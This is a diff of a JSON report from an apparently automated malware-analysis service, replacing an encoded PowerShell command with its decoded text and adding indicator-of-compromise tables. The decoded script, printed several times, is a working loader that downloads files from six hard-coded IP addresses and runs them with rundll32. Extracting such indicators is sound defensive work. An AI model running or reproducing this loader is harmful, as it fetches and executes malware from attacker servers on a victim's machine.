@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 121,
+    "score": 122,
     "sections": [
       {
         "auto_collapse": false,
@@ -100,7 +100,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAIAA9ACAAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADkALgAyADQANwAuADMAMAAuADIAMAAzAC8ARgBmAFkASQBKAGYAeAAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA5ADQALgAxADMAMQAuADEAMQA3AC4AMQAxADEALwBFAHQAWAB0AEsAVgBtAEYATQBHAE4AZgAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADQAMQAuADIAMAA1AC8AQgA3AGgAUQBnAEcAdQBIAEMAOQA0AEEALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADIANQAuADEAMgA5AC4AMQAxADQALwBjADQAYgBPAFQAcAB5AEwANABJAC4AZABhAHQALABoAHQAdABwADoALwAvADIAMQA2AC4AMQA0ADYALgAyADUALgAxADIAOQAvAGIAdgBXAFYAYQBoADAAZABhAE0ARwAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwAxADQAMQAuADkANAAuADgANgAuADkAMAAvADEAWABBAFYATgAuAGQAYQB0ACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAGkAbgAgACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAKQAgAHsAdAByAHkAIAB7AHcAZwBlAHQAIAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEAOAAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAYwBoAGkAcwBlAGwAaQBuAGcALgBPAHUAdABwAGUAbwBwAGwAaQBuAGcASABhAHUAbgBjAGUAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADEAMAAwADAAMAAwACkAIAB7AHMAdABhAHIAdAAgAHIAdQBuAGQAbABsADMAMgAgACQAZQBuAHYAOgBUAEUATQBQAFwAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQAsAFgANQA1ADUAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA0ADsAfQB9AA==\"",
+        "body": "Start-Sleep -Seconds 4;$FractionallyTheopathy = (\"http://199.247.30.203/FfYIJfx.dat,http://94.131.117.111/EtXtKVmFMGNf.dat,http://85.239.41.205/B7hQgGuHC94A.dat,http://104.225.129.114/c4bOTpyL4I.dat,http://216.146.25.129/bvWVah0daMG.dat,http://141.94.86.90/1XAVN.dat\").split(\",\");foreach ($unwomanized in $FractionallyTheopathy) {try {wget $unwomanized -TimeoutSec 18 -O $env:TEMP\\chiseling.OutpeoplingHaunce;if ((Get-Item $env:TEMP\\chiseling.OutpeoplingHaunce).length -ge 100000) {start rundll32 $env:TEMP\\\\chiseling.OutpeoplingHaunce,X555;break;}}catch {Start-Sleep -Seconds 4;}}",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -109,12 +109,59 @@
           "dynamic": {
             "process": {
               "command_line": [
-                "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAIAA9ACAAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADkALgAyADQANwAuADMAMAAuADIAMAAzAC8ARgBmAFkASQBKAGYAeAAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA5ADQALgAxADMAMQAuADEAMQA3AC4AMQAxADEALwBFAHQAWAB0AEsAVgBtAEYATQBHAE4AZgAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADQAMQAuADIAMAA1AC8AQgA3AGgAUQBnAEcAdQBIAEMAOQA0AEEALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADIANQAuADEAMgA5AC4AMQAxADQALwBjADQAYgBPAFQAcAB5AEwANABJAC4AZABhAHQALABoAHQAdABwADoALwAvADIAMQA2AC4AMQA0ADYALgAyADUALgAxADIAOQAvAGIAdgBXAFYAYQBoADAAZABhAE0ARwAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwAxADQAMQAuADkANAAuADgANgAuADkAMAAvADEAWABBAFYATgAuAGQAYQB0ACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAGkAbgAgACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAKQAgAHsAdAByAHkAIAB7AHcAZwBlAHQAIAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEAOAAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAYwBoAGkAcwBlAGwAaQBuAGcALgBPAHUAdABwAGUAbwBwAGwAaQBuAGcASABhAHUAbgBjAGUAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADEAMAAwADAAMAAwACkAIAB7AHMAdABhAHIAdAAgAHIAdQBuAGQAbABsADMAMgAgACQAZQBuAHYAOgBUAEUATQBQAFwAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQAsAFgANQA1ADUAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA0ADsAfQB9AA==\""
+                "Start-Sleep -Seconds 4;$FractionallyTheopathy = (\"http://199.247.30.203/FfYIJfx.dat,http://94.131.117.111/EtXtKVmFMGNf.dat,http://85.239.41.205/B7hQgGuHC94A.dat,http://104.225.129.114/c4bOTpyL4I.dat,http://216.146.25.129/bvWVah0daMG.dat,http://141.94.86.90/1XAVN.dat\").split(\",\");foreach ($unwomanized in $FractionallyTheopathy) {try {wget $unwomanized -TimeoutSec 18 -O $env:TEMP\\chiseling.OutpeoplingHaunce;if ((Get-Item $env:TEMP\\chiseling.OutpeoplingHaunce).length -ge 100000) {start rundll32 $env:TEMP\\\\chiseling.OutpeoplingHaunce,X555;break;}}catch {Start-Sleep -Seconds 4;}}"
               ]
             }
           }
         },
         "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"104.225.129.114\"}, {\"ioc_type\": \"ip\", \"ioc\": \"141.94.86.90\"}, {\"ioc_type\": \"ip\", \"ioc\": \"199.247.30.203\"}, {\"ioc_type\": \"ip\", \"ioc\": \"216.146.25.129\"}, {\"ioc_type\": \"ip\", \"ioc\": \"85.239.41.205\"}, {\"ioc_type\": \"ip\", \"ioc\": \"94.131.117.111\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://104.225.129.114/c4botpyl4i.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/c4botpyl4i.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://141.94.86.90/1xavn.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/1xavn.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://199.247.30.203/ffyijfx.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ffyijfx.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://216.146.25.129/bvwvah0damg.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/bvwvah0damg.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://85.239.41.205/b7hqgguhc94a.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/b7hqgguhc94a.dat\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://94.131.117.111/etxtkvmfmgnf.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/etxtkvmfmgnf.dat\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "104.225.129.114",
+                "141.94.86.90",
+                "199.247.30.203",
+                "216.146.25.129",
+                "85.239.41.205",
+                "94.131.117.111"
+              ],
+              "uri": [
+                "http://104.225.129.114/c4botpyl4i.dat",
+                "http://141.94.86.90/1xavn.dat",
+                "http://199.247.30.203/ffyijfx.dat",
+                "http://216.146.25.129/bvwvah0damg.dat",
+                "http://85.239.41.205/b7hqgguhc94a.dat",
+                "http://94.131.117.111/etxtkvmfmgnf.dat"
+              ],
+              "uri_path": [
+                "/c4botpyl4i.dat",
+                "/1xavn.dat",
+                "/ffyijfx.dat",
+                "/bvwvah0damg.dat",
+                "/b7hqgguhc94a.dat",
+                "/etxtkvmfmgnf.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
         "zeroize_on_tag_safe": false
       }
     ]
@@ -130,8 +177,8 @@
         "sha256": "435e4333b650a89c4131be0994b61f5c0f28dfc3464168e925788be5e723db00"
       },
       {
-        "name": "cmd_0.bat",
-        "sha256": "b5d9b020c1e78665904d5e1f52162340e59952cbc11336507acdc6ac18fc15d3"
+        "name": "boxjs_cmds.ps1",
+        "sha256": "8305d2e384a2176ec2c8baa337a4762b0d8d19610c42749937df2d30bb6fb7a1"
       }
     ],
     "supplementary": [
@@ -147,6 +194,11 @@
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -179,7 +231,103 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAIAA9ACAAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADkALgAyADQANwAuADMAMAAuADIAMAAzAC8ARgBmAFkASQBKAGYAeAAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA5ADQALgAxADMAMQAuADEAMQA3AC4AMQAxADEALwBFAHQAWAB0AEsAVgBtAEYATQBHAE4AZgAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADQAMQAuADIAMAA1AC8AQgA3AGgAUQBnAEcAdQBIAEMAOQA0AEEALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADIANQAuADEAMgA5AC4AMQAxADQALwBjADQAYgBPAFQAcAB5AEwANABJAC4AZABhAHQALABoAHQAdABwADoALwAvADIAMQA2AC4AMQA0ADYALgAyADUALgAxADIAOQAvAGIAdgBXAFYAYQBoADAAZABhAE0ARwAuAGQAYQB0ACwAaAB0AHQAcAA6AC8ALwAxADQAMQAuADkANAAuADgANgAuADkAMAAvADEAWABBAFYATgAuAGQAYQB0ACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAGkAbgAgACQARgByAGEAYwB0AGkAbwBuAGEAbABsAHkAVABoAGUAbwBwAGEAdABoAHkAKQAgAHsAdAByAHkAIAB7AHcAZwBlAHQAIAAkAHUAbgB3AG8AbQBhAG4AaQB6AGUAZAAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEAOAAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAYwBoAGkAcwBlAGwAaQBuAGcALgBPAHUAdABwAGUAbwBwAGwAaQBuAGcASABhAHUAbgBjAGUAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADEAMAAwADAAMAAwACkAIAB7AHMAdABhAHIAdAAgAHIAdQBuAGQAbABsADMAMgAgACQAZQBuAHYAOgBUAEUATQBQAFwAXABjAGgAaQBzAGUAbABpAG4AZwAuAE8AdQB0AHAAZQBvAHAAbABpAG4AZwBIAGEAdQBuAGMAZQAsAFgANQA1ADUAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA0ADsAfQB9AA==\""
+          "value": "Start-Sleep -Seconds 4;$FractionallyTheopathy = (\"http://199.247.30.203/FfYIJfx.dat,http://94.131.117.111/EtXtKVmFMGNf.dat,http://85.239.41.205/B7hQgGuHC94A.dat,http://104.225.129.114/c4bOTpyL4I.dat,http://216.146.25.129/bvWVah0daMG.dat,http://141.94.86.90/1XAVN.dat\").split(\",\");foreach ($unwomanized in $FractionallyTheopathy) {try {wget $unwomanized -TimeoutSec 18 -O $env:TEMP\\chiseling.OutpeoplingHaunce;if ((Get-Item $env:TEMP\\chiseling.OutpeoplingHaunce).length -ge 100000) {start rundll32 $env:TEMP\\\\chiseling.OutpeoplingHaunce,X555;break;}}catch {Start-Sleep -Seconds 4;}}"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "104.225.129.114"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "141.94.86.90"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "199.247.30.203"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "216.146.25.129"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "85.239.41.205"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "94.131.117.111"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://104.225.129.114/c4botpyl4i.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://141.94.86.90/1xavn.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://199.247.30.203/ffyijfx.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://216.146.25.129/bvwvah0damg.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://85.239.41.205/b7hqgguhc94a.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://94.131.117.111/etxtkvmfmgnf.dat"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/1xavn.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/b7hqgguhc94a.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/bvwvah0damg.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/c4botpyl4i.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/etxtkvmfmgnf.dat"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/ffyijfx.dat"
         }
       ]
     },
